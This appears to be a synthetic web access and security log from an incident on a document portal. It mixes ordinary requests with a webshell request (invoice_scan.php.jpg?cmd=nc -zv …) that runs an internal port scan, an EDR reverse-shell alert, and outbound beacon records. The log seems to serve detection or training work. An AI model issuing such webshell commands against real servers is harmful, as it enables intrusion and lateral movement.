+45.155.204.19 - - [23/Jul/2026:02:23:51 +0000] "GET /uploads/invoice_scan.php.jpg?cmd=nc+-zv+10.4.2.89+22 HTTP/1.1" 200 326 "-" "curl/8.4.0"  WEBSHELL_EXEC internal_scan
+45.115.207.240 - - [23/Jul/2026:02:24:49 +0000] "GET /api/notifications HTTP/1.1" 302 14455 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/126.0.2592.68"
+[23/Jul/2026:02:26:53 +0000] SECURITY_ALERT source=edr severity=critical msg="Reverse shell processes .sysupd and .m2 detected on web-portal-03 and web-portal-07, hosts isolated, webshells quarantined"
+185.74.156.251 - - [23/Jul/2026:02:27:02 +0000] "GET /static/js/vendor.bundle.js HTTP/1.1" 404 19655 "-" "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
+154.30.218.125 - - [23/Jul/2026:02:27:39 +0000] "POST /documents/share HTTP/1.1" 200 1566 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/126.0.2592.68"
+[23/Jul/2026:02:28:46 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.31 dst=185.243.96.201 dport=8443 msg="outbound beacon from compromised host web-portal-07"
+45.19.172.62 - - [23/Jul/2026:02:30:52 +0000] "GET /documents/view?id=5521 HTTP/1.1" 404 11157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/126.0.2592.68"
+[23/Jul/2026:02:32:51 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.17 dst=45.155.204.90 dport=4444 msg="outbound beacon from compromised host web-portal-03"
+5.13.19.211 - - [23/Jul/2026:02:33:04 +0000] "GET /account/profile HTTP/1.1" 404 7605 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+178.84.67.140 - - [23/Jul/2026:02:34:24 +0000] "GET /health HTTP/1.1" 200 9100 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+5.150.243.16 - - [23/Jul/2026:02:35:04 +0000] "GET /api/documents?page=2 HTTP/1.1" 302 8678 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+[23/Jul/2026:02:36:46 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.31 dst=185.243.96.201 dport=8443 msg="outbound beacon from compromised host web-portal-07"
+[23/Jul/2026:02:41:51 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.17 dst=45.155.204.90 dport=4444 msg="outbound beacon from compromised host web-portal-03"
+197.124.160.253 - - [23/Jul/2026:02:42:47 +0000] "POST /documents/upload HTTP/1.1" 404 12727 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+[23/Jul/2026:02:44:46 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.31 dst=185.243.96.201 dport=8443 msg="outbound beacon from compromised host web-portal-07"
+62.40.241.184 - - [23/Jul/2026:02:45:00 +0000] "GET /api/notifications HTTP/1.1" 204 11819 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+46.133.108.212 - - [23/Jul/2026:02:45:05 +0000] "GET /account/profile HTTP/1.1" 200 27901 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
+88.72.227.36 - - [23/Jul/2026:02:49:55 +0000] "GET /documents/view?id=5521 HTTP/1.1" 204 26747 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+185.225.88.187 - - [23/Jul/2026:02:50:15 +0000] "GET /api/notifications HTTP/1.1" 200 14013 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
+102.56.197.74 - - [23/Jul/2026:02:50:33 +0000] "GET /dashboard HTTP/1.1" 200 17186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
+[23/Jul/2026:02:50:51 +0000] FIREWALL_LOG action=ALLOW proto=TCP src=10.4.2.17 dst=45.155.204.90 dport=4444 msg="outbound beacon from compromised host web-portal-03"
